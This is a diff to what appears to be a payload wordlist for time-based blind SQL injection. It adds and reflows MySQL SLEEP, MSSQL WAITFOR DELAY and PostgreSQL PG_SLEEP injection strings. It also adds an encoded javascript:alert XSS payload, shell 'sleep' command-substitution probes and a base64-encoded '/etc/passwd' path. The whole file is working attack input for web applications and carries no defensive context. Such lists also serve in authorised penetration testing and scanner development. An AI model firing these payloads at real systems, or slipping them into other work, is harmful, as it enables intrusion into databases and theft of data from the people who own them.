@@ -14,6 +14,14 @@ desc%2c(select*from(select(sleep(5)))a)
 (select(0) from(select(sleep(5)))v)+'"+
 (select(0) from(select(sleep(5)))v)+"*%2f(select(0) from(select(sleep( 5)))v)/'+(select (0) from(select(sleep(5)))v)+'"+
 (select(0) from(select(sleep(5)))v)+"*/(select(0) from(select(sleep(5) ))v)/'+(select (0) from (select(sleep(5)))v)+'\"+
+(select(0)from(select(sleep(6)))v)/*'+
+(select(0)from(select(sleep(6)))v) +"*/
+orwa';%20waitfor%20delay%20'0:0:6'%20--%20
+orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))—
+%26%2302java%26%23115cript:alert(document.domain)
+1;SELECT IF((8303>8302),SLEEP(9),2356)#
+1%3BSELECT%20IF%28%288303%3E8302%29%2CSLEEP%285%29%2C2356%29%23
+L2V0Yy9wYXNzd2Q=
 (select(0) from(select(sleep(5)))v)+\"*/ ',''),/*test*/%26%26%09s LeEp( 5)%09--+AND BLIND:1 and sleep 5--
 1 and sleep 5
 1 and sleep(5)--
@@ -43,14 +51,22 @@ or SELECT SLEEP(5); #
 or SLEEP(5)
 or SLEEP(5)#
 or SLEEP(5)--
-or SLEEP(5)=" or SLEEP(5)='
-11
+or SLEEP(5)=" 
+or SLEEP(5)='
 'OR SLEEP(5)#
-OR SLEEP(5)#
+"OR SLEEP(5)#
 ') OR SLEEP (5)#
-)) or sleep(5)='
+')) or sleep(5)='
+"or sleep(5)#
+1) or sleep(5)# 
+)) or sleep(5)=' 
+1)) or sleep(5)# 
 or sleep(5)#
-1) or sleep(5)# )) or sleep(5)=' 1)) or sleep(5)# or sleep(5)# %20'sleep%2050' %20$ (sleep%2050) ")) or sleep(5)=" or sleep(5)=' ") or sleep(5)="
+%20'sleep%2050'
+%20$(sleep%2050)
+")) or sleep(5)="
+or sleep(5)=' 
+") or sleep(5)="
 ) or sleep(5)='
 1 or sleep(5)#
 You can replace AND / OR1 AND (SELECT 1337 FROM
@@ -60,21 +76,19 @@ You can replace AND / OR1 AND (SELECT 1337 FROM
 ' AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY) AND '1337'='1337
 ') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('PBiy'='PBiy
 ) AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY)-- 1337
-) AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY) AND (1337=1337 )) AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY) AND ((1337=1337 ))) AND (SELECT 1337 FROM (SELECT(SLEEP (5)))YYYY) AND (((1337-1337 1 AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY)# 1337
+) AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY) AND (1337=1337
+)) AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY) AND ((1337=1337 
+))) AND (SELECT 1337 FROM (SELECT(SLEEP (5)))YYYY) AND (((1337-1337 
+1 AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY)# 1337
 ) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT (SLEEP(5)))YYYY)-- 1337
 1 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5))) YYYY)-- 1337
-+(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM
-(SELECT(SLEEP (5)))YYYY))+
-)) AS 1337 WHERE 1337-1337 AND (SELECT 1337 FROM
-(SELECT(SLEEP (5)))YYYY)-- 1337
-) AS 1337 WHERE 1337-1337 AND (SELECT 1337 FROM
-(SELECT(SLEEP (5)))YYYY)-- 1337
-WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP (5)))YYYY)--
-1337
-`) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) --
-1337
-`='1' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND `1`=`1 ]-(SELECT 0 WHERE 1337-1337 AND (SELECT 1337 FROM
-(SELECT(SLEEP (5)))YYYY))|[1
++(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP (5)))YYYY))+
+)) AS 1337 WHERE 1337-1337 AND (SELECT 1337 FROM (SELECT(SLEEP (5)))YYYY)-- 1337
+) AS 1337 WHERE 1337-1337 AND (SELECT 1337 FROM (SELECT(SLEEP (5)))YYYY)-- 1337
+WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP (5)))YYYY)-- 1337
+`) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) -- 1337
+`='1' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND `1`=`1
+]-(SELECT 0 WHERE 1337-1337 AND (SELECT 1337 FROM (SELECT(SLEEP (5)))YYYY))|[1
 ') AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY)-- 1337
 ' AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY)-- 1337
 " AND (SELECT 1337 FROM (SELECT (SLEEP (5)))YYYY)-- 1337
